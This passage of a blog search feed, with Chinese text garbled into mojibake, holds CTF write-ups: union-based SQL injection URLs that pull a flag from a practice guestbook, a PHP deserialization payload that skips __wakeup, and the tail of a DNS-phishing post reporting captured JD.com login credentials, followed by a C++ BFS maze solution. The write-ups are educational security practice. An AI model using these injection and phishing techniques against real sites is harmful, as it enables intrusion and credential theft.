ç„¶åç‚¹å‡»ç™»å½•</a></p><p>2.åœ¨kaliè™šæ‹Ÿæœºä¸­ï¼Œå·²ç»é’“é±¼æˆåŠŸï¼Œå¹¶é’“åˆ°äº¬ä¸œçš„ç™»å½•è´¦æˆ·åŠå¯†ç (cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>guestbook</title>
    <link href="/2020/04/18/Guestbook/"/>
    <url>/2020/04/18/Guestbook/</url>
    
    <content type="html"><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new">guestbook</a></h1><span id="more"></span><p>é¢˜ç›®æç¤ºï¼š<strong>This guestbook sucks. sqlmap is your friend.</strong> æ˜¯sqlæ³¨å…¥<br>ç‚¹å‡»Message List æ—¶æ˜¯ç©ºçš„ï¼Œ ç‚¹å‡»postæ˜¯å¯ä»¥æäº¤æ–°ä¿¡æ¯ï¼Œç‚¹å‡»æŸ¥çœ‹æ–°ä¿¡æ¯</p><p>åœ¨idå€¼ååŠ ä¸Šâ€ â€˜ â€œæµ‹è¯•æ˜¯å¦å­˜åœ¨æµ‹è¯•ç‚¹ç½‘é¡µæŠ¥é”™è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹<br>union æ³¨å…¥!<br>æŸ¥çœ‹åˆ—</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span><span class="hljs-comment">#</span><span class="hljs-regexp">//i</span>d=-<span class="hljs-number">1</span> æ˜¯è®©å‰é¢çš„å†…å®¹ä¸æ˜¾ç¤º</code></pre><p>3è¢«å›æ˜¾</p><p>1.æŸ¥çœ‹æ•°æ®åº“å</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%<span class="hljs-number">20</span>#</code></pre><p>æ•°æ®åº“çš„åå­—<code>g8</code></p><p>2.æŸ¥çœ‹è¡¨å</p><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre><p>å‘ç°æœ‰ä¸€ä¸ªè¡¨ <code>flag</code></p><p>3.æµ‹è¯•è¡¨çš„å­—æ®µ</p><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre><p>ä»ç„¶æ˜¾ç¤º<code>flag</code></p><p>4.è¯»å–flag   </p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre><p>å¾—åˆ°flag!</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlæ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ååºåˆ—åŒ–</title>
    <link href="/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>ååºåˆ—åŒ–</p><span id="more"></span><p>PHPé­”æœ¯æ–¹æ³•_ wakeup()æ˜¯åœ¨ååºåˆ—åŒ–æ“ä½œä¸­èµ·ä½œç”¨çš„é­”æ³•å‡½æ•°ï¼Œ å½“unserializeçš„æ—¶å€™ï¼Œ ä¼šæ£€æŸ¥æ—¶å€™å­˜åœ¨ __ wakeup()å‡½æ•°, å¦‚æœå­˜åœ¨çš„è¯ï¼Œä¼šä¼˜å…ˆè°ƒç”¨__wakeup()å‡½æ•°ã€‚ </p><p>è€Œ<strong>wakeup()å‡½æ•°æ¼æ´å°±æ˜¯ä¸å¯¹è±¡çš„å±æ€§ä¸ªæ•°æœ‰å…³ï¼Œå¦‚æœåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå±æ€§ä¸ªæ•°çš„æ•°å­—ä¸çœŸå®å±æ€§ä¸ªæ•°ä¸€è‡´ï¼Œé‚£ä¹ˆå°±è°ƒç”¨</strong>wakeup()å‡½æ•°, å¦‚æœè¯¥æ•°å­—å¤§äºçœŸå®å±æ€§ä¸ªæ•°ï¼Œå°±ä¼šç»•è¿‡__wakeup()å‡½æ•°ã€‚</p><p>serialize()å‡½æ•°ï¼šç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åºåˆ—åŒ–å¯¹è±¡åï¼Œ å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å®ƒä¼ é€’ç»™å…¶ä»–éœ€è¦å®ƒçš„åœ°æ–¹ï¼Œä¸”å…¶ç±»å‹å’Œç»“æ„ä¸ä¼šæ”¹å˜ã€‚</p><p>unserialize()å‡½æ•°ï¼šç”¨äºå°†é€šè¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„ã€‚</p><p>ä¸¾ä¾‹è¯´æ˜</p><pre><code>&lt;?phpclass Student&#123;public $full_name = &apos;zhangsan&apos;;public $score = 150;public $grades = array();function __wakeup() &#123;echo &quot;__wakeup is invoked&quot;;&#125;&#125;$s = new Student();var_dump(serialize($s));?&gt;</code></pre><hr><pre><code>O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;</code></pre><p>å„ä¸ªç¬¦å·çš„å«ä¹‰<br><strong>å˜é‡ç±»å‹ï¼šç±»åé•¿åº¦ï¼ˆå­—èŠ‚ï¼‰ï¼šç±»åï¼šå±æ€§æ•°é‡ï¼š{å±æ€§åç±»å‹ï¼šå±æ€§åé•¿åº¦ï¼šå±æ€§åï¼šå±æ€§å€¼ç±»å‹ï¼šå±æ€§å€¼é•¿åº¦ï¼šå±æ€§å€¼å†…å®¹}</strong></p><p>å…¶ä¸­åœ¨Stuedentç±»åé¢æœ‰ä¸€ä¸ªæ•°å­—3ï¼Œæ•´ä¸ª3è¡¨ç¤ºçš„å°±æ˜¯Studentç±»å­˜åœ¨3ä¸ªå±æ€§ã€‚<br>wakeup()æ¼æ´å°±æ˜¯ä¸æ•´ä¸ªå±æ€§ä¸ªæ•°å€¼æœ‰å…³ã€‚<strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚</strong></p><p>å½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¸ªæ•°ä¿®æ”¹ä¸º5ï¼Œå˜ä¸º<br>O:7:â€Studentâ€:5:{s:9:â€full_nameâ€;s:8:â€zhangsanâ€;s:5:â€scoreâ€;i:150;s:6:â€gradesâ€;a:0:{}}</p><p>æœ€åæ‰§è¡Œè¿è¡Œçš„ä»£ç å¦‚ä¸‹:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$full_name</span> = <span class="hljs-string">&#x27;zhangsan&#x27;</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$score</span> = <span class="hljs-number">150</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$grades</span> = <span class="hljs-keyword">array</span>();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup is invoked&quot;</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;var_dump(<span class="hljs-keyword">$this</span>);&#125;&#125;<span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Student();<span class="hljs-variable">$stu</span> = unserialize(<span class="hljs-string">&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="ä¸¾ä¾‹è¯´æ˜"><a href="#ä¸¾ä¾‹è¯´æ˜" class="headerlink" title="ä¸¾ä¾‹è¯´æ˜"></a>ä¸¾ä¾‹è¯´æ˜</h2><p>é¢˜ç›®</p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);&#125;?code=</code></pre><hr><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªåä¸ºxctfçš„ç±»</span><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»å±æ€§$flagï¼Œå€¼ä¸º111</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»æ–¹æ³•__wakeup()ï¼Œè¾“å‡ºbad requestsåé€€å‡ºå½“å‰è„šæœ¬</span><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);&#125;&#125;<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//ä½¿ç”¨newè¿ç®—ç¬¦æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼ˆxctfï¼‰çš„å¯¹è±¡ä¸ºtest</span><span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$test</span>));   <span class="hljs-comment">//è¾“å‡ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼ˆtestï¼‰</span><span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å‡ºç»“æœ</p><pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>æˆ‘ä»¬è¦ååºåˆ—åŒ–xctfç±»çš„åŒæ—¶è¿˜è¦ç»•è¿‡wakeupæ–¹æ³•çš„æ‰§è¡Œï¼ˆå¦‚æœä¸ç»•è¿‡wakeup()æ–¹æ³•ï¼Œé‚£ä¹ˆå°†ä¼šè¾“å‡ºbad requestså¹¶é€€å‡ºè„šæœ¬ï¼‰ï¼Œwakeup()å‡½æ•°æ¼æ´åŸç†ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚å› æ­¤ï¼Œéœ€è¦ä¿®æ”¹åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å±æ€§ä¸ªæ•°ï¼š<br>å½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¸ªæ•°ç”±çœŸå®å€¼1ä¿®æ”¹ä¸º2ï¼Œå³å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>è®¿é—®url?code=O:4:â€xctfâ€:2:{s:4:â€flagâ€;s:3:â€111â€;}</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unserialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¿·å®«é—®é¢˜</title>
    <link href="/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/"/>
    <url>/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="è¿·å®«é—®é¢˜"><a href="#è¿·å®«é—®é¢˜" class="headerlink" title="è¿·å®«é—®é¢˜"></a>è¿·å®«é—®é¢˜</h1><span id="more"></span><h2 id="åŸé¢˜"><a href="#åŸé¢˜" class="headerlink" title="åŸé¢˜"></a>åŸé¢˜</h2><p>é¢˜ç›®æè¿°</p><p>å°æ˜ç½®èº«äºä¸€ä¸ªè¿·å®«ï¼Œè¯·ä½ å¸®å°æ˜æ‰¾å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ã€‚<br> å°æ˜åªèƒ½å‘ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ç§»åŠ¨ã€‚</p><p>è¾“å…¥</p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°Tï¼Œè¡¨ç¤ºæœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚<br> æ¯ç»„è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°Nå’ŒMï¼ˆ1&lt;=N,M&lt;=100ï¼‰ã€‚<br> æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡Œè¾“å…¥Mä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦è¡¨ç¤ºè¿·å®«ä¸­çš„ä¸€ä¸ªå°æ–¹æ ¼ã€‚<br> å­—ç¬¦çš„å«ä¹‰å¦‚ä¸‹ï¼š<br>â€˜Sâ€™ï¼šèµ·ç‚¹<br>â€˜Eâ€™ï¼šç»ˆç‚¹<br>â€˜-â€™ï¼šç©ºåœ°ï¼Œå¯ä»¥é€šè¿‡<br>â€˜#â€™ï¼šéšœç¢ï¼Œæ— æ³•é€šè¿‡<br> è¾“å…¥æ•°æ®ä¿è¯æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹ã€‚</p><p>è¾“å‡º</p><p>å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ï¼Œå¦‚æœä¸å­˜åœ¨ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯ï¼Œåˆ™è¾“å‡º-1ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥"><a href="#æ ·ä¾‹è¾“å…¥" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code>15 5s-###-----##---E#------##</code></pre><h3 id="æ ·ä¾‹è¾“å‡º"><a href="#æ ·ä¾‹è¾“å‡º" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code>9</code></pre><h2 id="è§£å†³ä»£ç "><a href="#è§£å†³ä»£ç " class="headerlink" title="è§£å†³ä»£ç "></a>è§£å†³ä»£ç </h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//è®¡æ­¥æ•°ç»„  è®°å½•èµ°åˆ°è¿™ä¸ªä½ç½®æ‰€éœ€çš„æ­¥æ•° ä¸èƒ½èµ°åˆ°çš„ä½ç½®æ ‡è®°ä¸º-1 </span><span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//ç”¨äºå­˜æ”¾è¿·å®«åœ°å›¾ </span><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>,intP;  //åæ ‡<span class="hljs-keyword">int</span> to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;;  //åœ¨å½“å‰åæ ‡ä¸‹èƒ½èµ°çš„å››ä¸ªæ–¹å‘<span class="hljs-keyword">int</span> sx,ex,sy,ey;  //(sx,sy)ä¸ºèµ·ç‚¹åæ ‡  ï¼ˆex,eyï¼‰ä¸ºç»ˆç‚¹åæ ‡<span class="hljs-keyword">int</span> x,y,nx,ny; //(x,y)ä¸ºå‡½æ•°ä¸­å½“å‰ä½ç½®åæ ‡   ï¼ˆnx,ny)ä¸ºæ¥ä¸‹æ¥èƒ½åˆ°è¾¾çš„åæ ‡ <span class="hljs-keyword">int</span> r,l;  //rä¸ºè¡Œæ•° lä¸ºåˆ—æ•° <span class="hljs-keyword">int</span> bfs()&#123;<span class="hljs-built_in">memset</span>(de,-1,<span class="hljs-keyword">sizeof</span>(de));<span class="hljs-built_in">queue</span>&lt;Pqu;qu.push(P(sx,sy));   //å°†èµ·ç‚¹åæ ‡æ”¾å…¥é˜Ÿå¤´ de[sx][sy]=0;<span class="hljs-keyword">while</span>(!qu.empty()) &#123;P p=qu.front();   //å–å‡ºé˜Ÿå¤´åæ ‡ qu.pop() ;//åˆ é™¤å¯¹å¤´åŠèµ°è¿‡çš„åæ ‡ x=p.first,y=p.second; <span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; //åˆ°è¾¾ç»ˆç‚¹ è·³å‡ºå¾ªç¯ <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=0;i&lt;4;i++)&#123;nx=x+to[0][i];//å¼€å§‹å‘å››ä¸ªæ–¹å‘ç§»åŠ¨ ny=y+to[1][i];<span class="hljs-keyword">if</span>(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">&#x27;#&#x27;</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>) <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦è¶Šç•Œ ä»¥åŠæ˜¯å¦èƒ½èµ°  æ’é™¤èµ°è¿‡çš„è·¯ </span> &#123;  qu.push(P(nx,ny));  <span class="hljs-comment">//å°†èƒ½èµ°çš„åæ ‡æ”¾å…¥é˜Ÿåˆ— ä¹‹åä¾æ¬¡åˆ é™¤ </span> de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//æ­¥æ•°åŠ ä¸€ </span>  &#125;   &#125;&#125;<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//ç»ˆç‚¹çš„è®°æ­¥æ•°ç»„ä¸º-1 åŠä¸èƒ½åˆ°è¾¾ç»ˆç‚¹ </span><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; &#125; <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> n,i,j;<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;<span class="hljs-keyword">while</span>(n--)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; <span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">&#x27;S&#x27;</span>) <span class="hljs-comment">//è®°å½•èµ·ç‚¹åæ ‡ </span> &#123;sx=i,sy=j; &#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">&#x27;E&#x27;</span>)  <span class="hljs-comment">//è®°å½•ç»ˆç‚¹åæ ‡ </span> &#123; ex=i,ey=j; &#125;&#125;&#125;<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
